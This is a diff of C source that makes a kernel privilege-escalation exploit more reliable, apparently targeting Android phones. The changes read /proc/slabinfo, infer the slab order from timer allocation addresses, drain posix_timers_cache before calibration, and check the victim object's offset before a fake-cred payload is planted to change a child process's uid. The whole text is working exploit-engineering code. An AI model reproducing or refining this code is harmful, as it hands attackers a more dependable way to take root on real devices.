@@ -681,6 +681,152 @@ static void slab_usage(const char *tag)
     fclose(f);
 }
 
+/*
+ * Read the *real* geometry of posix_timers_cache from /proc/slabinfo.
+ *
+ * This is the authoritative source and it is readable from the shell domain,
+ * unlike the tracefs metadata.  The slabinfo columns are
+ *   name active_objs num_objs objsize objperslab pagesperslab
+ * so pagesperslab alone fixes the SLUB order, no voting required.
+ *
+ * Why this matters: calibrate_base()'s vote picks the order that makes the
+ * recorded slab pages line up, and that vote can be wrong.  A phone with 31
+ * objects per slab has order 1; if the vote returns order 0, SLAB_SIZE
+ * becomes 4096 while the kernel is really grouping 31 objects into 8192
+ * bytes.  Every offset derived from SLAB_MASK / SLAB_OFF_MASK is then wrong
+ * (the fake cred lands half a slab away from the node, the spray sends 4096
+ * where 8192 is needed), the plant "succeeds" and the child never changes
+ * uid.  That is exactly the `mode=fake ... agree=0 ... child woke uid=2000`
+ * failure: the trigger and the erase worked, the payload was in the wrong
+ * place.
+ *
+ * Returns 0 and fills the out-params on success, -1 when slabinfo is
+ * unreadable or the line does not parse.
+ */
+static int slabinfo_geometry(unsigned *out_order, unsigned long *out_size,
+                             unsigned long *out_objsize,
+                             unsigned long *out_objperslab)
+{
+    FILE *f = fopen("/proc/slabinfo", "r");
+    char line[256];
+    int r = -1;
+
+    if (!f)
+        return -1;
+    while (fgets(line, sizeof(line), f))
+    {
+        char name[64];
+        unsigned long active = 0, total = 0, objsize = 0, objper = 0;
+        unsigned long pages = 0;
+
+        if (strncmp(line, "posix_timers_cache ", 19))
+            continue;
+        if (sscanf(line, "%63s %lu %lu %lu %lu %lu", name, &active, &total,
+                   &objsize, &objper, &pages) != 6)
+            break;
+        if (!pages || pages > 32)
+            break;
+        /* pagesperslab is a power of two; the exponent is the SLUB order. */
+        {
+            unsigned order = 0;
+
+            while ((1UL << order) < pages)
+                order++;
+            if ((1UL << order) != pages)
+                break;
+            *out_order = order;
+            *out_size = (unsigned long)getpagesize() << order;
+            *out_objsize = objsize;
+            *out_objperslab = objper;
+            r = 0;
+        }
+        break;
+    }
+    fclose(f);
+    return r;
+}
+
+/*
+ * Free objects currently parked in posix_timers_cache, i.e. how many
+ * timer_create() calls this boot can serve without asking SLUB for a new
+ * slab.  Calibration needs that number: see calibrate_base().
+ */
+static long slab_free_objects(void)
+{
+    FILE *f = fopen("/proc/slabinfo", "r");
+    char line[256];
+    long r = -1;
+
+    if (!f)
+        return -1;
+    while (fgets(line, sizeof(line), f))
+    {
+        unsigned long active = 0, total = 0;
+
+        if (strncmp(line, "posix_timers_cache ", 19))
+            continue;
+        if (sscanf(line, "posix_timers_cache %lu %lu", &active, &total) == 2 &&
+            total >= active)
+            r = (long)(total - active);
+        break;
+    }
+    fclose(f);
+    return r;
+}
+
+/*
+ * Derive posix_timers_cache's SLUB order from timer allocation addresses
+ * alone, for the case where /proc/slabinfo is unreadable (some hardened
+ * kernels ship it as 0400).  No root is involved either way: this uses only
+ * the shell-domain trace records the exploit already reads.
+ *
+ * The lowest set bit of a slab address is NOT the order: SLUB keeps the
+ * block's `struct slab` at the start of the first page, so objects begin
+ * after it and `ptr & -ptr` is a lower bound on the block size, never an
+ * upper one -- on the device that reported this bug it yields 0x1000 for a
+ * block that is really 0x2000.
+ *
+ * The reliable signal is the in-slab period.  Objects sit at
+ * page ->+#+0, +1*obj, +2*obj, ... with the same offset inside every page of
+ * the block, so an 8K slab with 31 objects leaves a cluster of this slab's
+ * addresses inside each 8K window (15 or 16 per 4K half), and an order-0
+ * slab shows the same periodicity inside 4K.  Score each candidate order by
+ * how many addresses are object-aligned within it.
+ */
+static unsigned derive_order_from_ptrs(const unsigned long long *ptrs,
+                                       int nrec, unsigned long long objsize)
+{
+    unsigned best_order = 0;
+    int best_score = -1;
+
+    if (!nrec || !objsize || objsize > ((unsigned long long)getpagesize() << 3))
+        return 0;
+
+    for (unsigned order = 0; order <= 3; order++)
+    {
+        unsigned long long size = (unsigned long long)getpagesize() << order;
+        unsigned long long per = size / objsize;
+        int aligned = 0;
+
+        if (!per || per > 1024)
+            continue;
+        for (int i = 0; i < nrec; i++)
+            if (((ptrs[i] & (size - 1)) % objsize) == 0)
+                aligned++;
+        /*
+         * Require near-total alignment: a 4K window on an 8K slab aligns
+         * only about half the addresses.  Prefer the largest order that
+         * qualifies, because an 8K block also satisfies the 4K test.
+         */
+        if (aligned * 20 >= nrec * 19 && aligned > best_score)
+        {
+            best_score = aligned;
+            best_order = order;
+        }
+    }
+    return best_order;
+}
+
 /* posix_timers_cache active object count, or -1 when unreadable. */
 static long slab_active(void)
 {
@@ -1255,11 +1401,34 @@ static unsigned long long vote_base(const unsigned char *b, size_t n, int pid,
                     f = 1;
                     break;
                 }
-            if (!f && hc < 64)
+            /*
+             * A candidate that does not fit must still be counted: the
+             * previous version dropped every vote past the 64th distinct
+             * key, so on a busy allocator the true base (which arrives
+             * early, from the dense run of *this* slab) could lose to a
+             * spurious key that kept getting recounts.  Evict the weakest
+             * entry instead of ignoring the vote.
+             */
+            if (!f)
             {
-                hist[hc] = base;
-                hcnt[hc] = 1;
-                hc++;
+                if (hc < 64)
+                {
+                    hist[hc] = base;
+                    hcnt[hc] = 1;
+                    hc++;
+                }
+                else
+                {
+                    int min_k = 0;
+
+                    for (int k = 1; k < hc; k++)
+                        if (hcnt[k] < hcnt[min_k])
+                            min_k = k;
+                    if (hcnt[min_k] == 1)
+                        continue; /* nothing worth evicting */
+                    hist[min_k] = base;
+                    hcnt[min_k] = 1;
+                }
             }
         }
     }
@@ -1279,6 +1448,49 @@ static unsigned long long calibrate_base(unsigned char *raw)
     unsigned long long site0 = 0;
     int made = 0, me = getpid();
     long n;
+    long free_objs = slab_free_objects();
+
+    /*
+     * Fill every object SLUB is already holding before the measured burst.
+     *
+     * The base vote pairs a timer slab with the mm_page_alloc that created
+     * it, so it can only see slabs allocated *during* the window.  A warm
+     * cache breaks that: after any earlier exploit run, posix_timers_cache
+     * has free objects in existing slabs, so timer_create() hands those out
+     * and SLUB allocates nothing.  The vote then sees only the handful of
+     * pages that happen to be needed, which on this device is the classic
+     * `count=31 order=0` (one 8K slab's worth of allocations still produced
+     * a few 4K page events), instead of the `count=483 order=1` a cold
+     * cache gives.  Consuming the free objects first restores the cold
+     * profile, so the order that wins is the real one.
+     *
+     * The throwaway timers are never deleted: their objects stay owned by
+     * this process for the rest of the run, which is exactly what the
+     * exploit wants anyway (it pre-fills 4096 more later).
+     */
+    if (free_objs > 0 && free_objs < 1 << 20)
+    {
+        timer_t *drain = calloc((size_t)free_objs + 8, sizeof(*drain));
+        int n_d = 0;
+
+        if (drain)
+        {
+            struct sigevent ev;
+
+            memset(&ev, 0, sizeof(ev));
+            ev.sigev_notify = SIGEV_NONE;
+            for (long i = 0; i < free_objs + 8; i++)
+            {
+                if (timer_create(CLOCK_MONOTONIC, &ev, &drain[n_d]))
+                    break;
+                n_d++;
+            }
+            logf("[base] drained %d free timers (slab free was %ld)\n", n_d,
+                 free_objs);
+            /* Keep the array: the objects must stay allocated, so it is
+             * deliberately not freed. */
+        }
+    }
 
     trace_start();
     for (int i = 0; i < 512; i++)
@@ -1303,6 +1515,67 @@ static unsigned long long calibrate_base(unsigned char *raw)
         unsigned long long best = 0, bestc = 0;
         unsigned best_order = SLAB_ORDER;
         unsigned long long best_size = SLAB_SIZE;
+        unsigned si_order = 0;
+        unsigned long si_size = 0, si_obj = 0, si_per = 0;
+        int have_si = slabinfo_geometry(&si_order, &si_size, &si_obj,
+                                        &si_per) == 0;
+
+        /*
+         * /proc/slabinfo is authoritative when it is readable: pagesperslab
+         * states the SLUB order outright, while the vote below only infers
+         * it and has been observed to lock onto the wrong exponent (order 0
+         * on a 31-object order-1 slab), which silently shifts every offset
+         * by half a slab.  Use it directly and keep the vote for the case
+         * where slabinfo is not readable.
+         */
+        if (have_si && si_size && si_order <= 3)
+        {
+            if ((unsigned long long)si_size != SLAB_SIZE ||
+                si_order != (unsigned)SLAB_ORDER)
+            {
+                logf("[!] slab geometry mismatch: conf order=%u size=%#llx, "
+                     "slabinfo order=%u size=%#lx (obj=%lu per=%lu); "
+                     "using slabinfo geometry\n",
+                     SLAB_ORDER, (unsigned long long)SLAB_SIZE, si_order,
+                     si_size, si_obj, si_per);
+                g_cfg.slab_order = si_order;
+                g_cfg.slab_size = si_size;
+            }
+            else
+                logf("[+] slab geometry confirmed by slabinfo: order=%u "
+                     "size=%#lx obj=%lu per=%lu\n", si_order, si_size,
+                     si_obj, si_per);
+            best_order = si_order;
+            best_size = si_size;
+        }
+        if (have_si && si_obj && si_obj != (unsigned long)TIMER_ALLOC)
+            logf("[!] posix_timers_cache objsize=%lu but conf timer_alloc="
+                 "%#llx; the profile is wrong for this kernel\n", si_obj,
+                 (unsigned long long)TIMER_ALLOC);
+        /*
+         * No slabinfo: derive the order from the captured addresses instead
+         * of trusting a vote.  This keeps the run working on a kernel that
+         * hides /proc/slabinfo behind 0400, which needs no root either way.
+         */
+        if (!have_si && c > 0)
+        {
+            unsigned d_order = derive_order_from_ptrs(ptrs, c, TIMER_ALLOC);
+            unsigned long long d_size =
+                (unsigned long long)PAGE << d_order;
+
+            if (d_order != (unsigned)SLAB_ORDER)
+                logf("[!] slabinfo unreadable; address periodicity says "
+                     "order=%u size=%#llx, conf says order=%u size=%#llx; "
+                     "using the derived geometry\n", d_order, d_size,
+                     SLAB_ORDER, (unsigned long long)SLAB_SIZE);
+            else
+                logf("[+] slabinfo unreadable; address periodicity confirms "
+                     "order=%u size=%#llx\n", d_order, d_size);
+            g_cfg.slab_order = d_order;
+            g_cfg.slab_size = d_size;
+            best_order = d_order;
+            best_size = d_size;
+        }
 
         for (unsigned order = 0; order <= 3; order++)
         {
@@ -1311,6 +1584,13 @@ static unsigned long long calibrate_base(unsigned char *raw)
             unsigned long long base = vote_base(raw, (size_t)n, me, ptrs, c,
                                                 order, size, &cnt);
 
+            /*
+             * With slabinfo in hand, only accept the vote for the real
+             * geometry; a stronger vote for another order is the very
+             * mistake this guard exists to reject.
+             */
+            if (have_si && si_size && order != si_order)
+                continue;
             if (cnt > bestc)
             {
                 best = base;
@@ -1319,13 +1599,45 @@ static unsigned long long calibrate_base(unsigned char *raw)
                 best_size = size;
             }
         }
+        /*
+         * Fall back to a vote on *any* order when the real geometry produced
+         * none.  This happens if the drain above could not force new slabs
+         * (a very small or very full cache): the geometry stays whatever
+         * slabinfo said, and only the linear-map base is borrowed from
+         * another order's pairing.  The base is a property of the direct map,
+         * not of the slab, so a base voted at the wrong order is still the
+         * right base once a slab was matched at all; using it is strictly
+         * better than failing calibration and never reaching a plant.
+         */
+        if (bestc < 4 && have_si)
+        {
+            for (unsigned order = 0; order <= 3; order++)
+            {
+                unsigned long long size = (unsigned long long)PAGE << order;
+                unsigned long long cnt = 0;
+                unsigned long long base =
+                    vote_base(raw, (size_t)n, me, ptrs, c, order, size, &cnt);
+                int agree = 0;
+
+                if (cnt <= bestc)
+                    continue;
+                if (!(have_si && si_size) || order == si_order)
+                    agree = 1;
+                if (!agree)
+                    logf("[!] base fallback: order=%u votes=%llu while the "
+                         "real slab order is %u; using the base only\n",
+                         order, cnt, si_order);
+                best = base;
+                bestc = cnt;
+            }
+        }
         if (best < LINEAR_MIN || best > LINEAR_MAX)
             bestc = 0;
-        if (bestc >= 4 &&
+        if (!have_si && bestc >= 4 &&
             (best_order != SLAB_ORDER || best_size != SLAB_SIZE))
         {
             logf("[!] slab geometry mismatch: conf order=%u size=%#llx, "
-                 "device order=%u size=%#llx; using device geometry\n",
+                 "vote order=%u size=%#llx; using voted geometry\n",
                  SLAB_ORDER, (unsigned long long)SLAB_SIZE, best_order,
                  best_size);
             g_cfg.slab_order = best_order;
@@ -1335,6 +1647,11 @@ static unsigned long long calibrate_base(unsigned char *raw)
              "order=%u size=%#llx\n",
              made, site0, site0 ? site0 - STATIC_TIMER_SITE : 0, best, bestc,
              best_order, best_size);
+        /*
+         * A slabinfo-validated geometry is not a vote: the base is the only
+         * thing calibration has to contribute here, so accept it even when
+         * the vote was weak.  Without slabinfo keep the old floor.
+         */
         if (bestc < 4)
             return 0;
         /*
@@ -2356,6 +2673,31 @@ static void run_plant(unsigned long long target, int tag, int mode,
     }
     V = kept[VICTIM_IDX];
     vslab = V & SLAB_MASK;
+    /*
+     * The victim must be a real posix_timers_cache object, i.e. its in-slab
+     * offset is a whole number of timer_alloc bytes.  The slab base itself is
+     * NOT timer_alloc aligned (31 * 264 = 8184 leaves 8 bytes of tail in an
+     * 8K slab), so only the offset may be checked.  A failed check means
+     * SLAB_SIZE is the wrong power of two for this kernel: the payload would
+     * be sprayed up to half a slab away from the stale node, the erase would
+     * find a zeroed node and silently write nothing, and the child would
+     * wake with its original uid while the plant still reports success.
+     */
+    if (((V & SLAB_OFF_MASK) % TIMER_ALLOC) != 0)
+    {
+        trace_stop();
+        kill(T, SIGKILL);
+        waitpid(T, NULL, 0);
+        logf("[-] plant%d victim offset %#llx is not a multiple of"
+             " timer_alloc=%#llx (order=%u size=%#llx): wrong slab geometry"
+             " for this kernel\n", tag, V & SLAB_OFF_MASK,
+             (unsigned long long)TIMER_ALLOC, SLAB_ORDER,
+             (unsigned long long)SLAB_SIZE);
+        /* Nothing was written and the trigger was reaped, so a fresh plant
+         * is safe; a transient mis-scan clears on the retry. */
+        res->retry = 1;
+        return;
+    }
     for (int i = 0; i < nkeep; i++)
         if ((kept[i] & SLAB_MASK) == vslab)
             slab_own++;
